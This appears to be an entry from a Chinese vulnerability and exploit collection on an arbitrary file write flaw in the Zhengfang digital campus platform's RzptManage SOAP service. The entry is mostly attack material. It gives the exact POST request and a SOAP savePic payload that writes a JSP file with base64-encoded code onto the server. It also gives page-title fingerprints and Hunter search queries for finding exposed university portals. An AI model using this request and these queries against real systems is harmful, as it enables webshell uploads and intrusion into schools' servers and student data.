# 正方数字化校园平台RzptManage存在任意文件写入漏洞

- **系统**：正方数字化校园平台　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="正方数字化校园信息门户"`
- **请求**：`POST /zfca/axis/RzptManage HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 808`　`Content-Type: text/xml;charset=UTF-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:pub="http://pubService.webServices.zfca.zfsoft.com">
<soapenv:Header/>
<soapenv:Body>
<pub:savePic soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<filepath xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">zkimvsrr.jsp</filepath>
<bytes xsi:type="soapenc:base64Binary" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">PCUgb3V0LnByaW50bG4oMTExKjExMSk7bmV3IG…（脚本共 1001 字，完整版见原文）
```

**其他**
- 正方数字化校园平台RzptManage存在任意文件写入漏洞: * 一、漏洞简介
* 二、影响版本
* 四、漏洞复现
***
- 版本: * hunter`(web.title="正方数字化校园信息门户" ｜ web.title="数字化校园信息门户" ｜ web.title="统一身份认证中心")&&web.body="正方"`、<code>web.body="zfca/login"&&web.body="login_bg"</code>
* 特征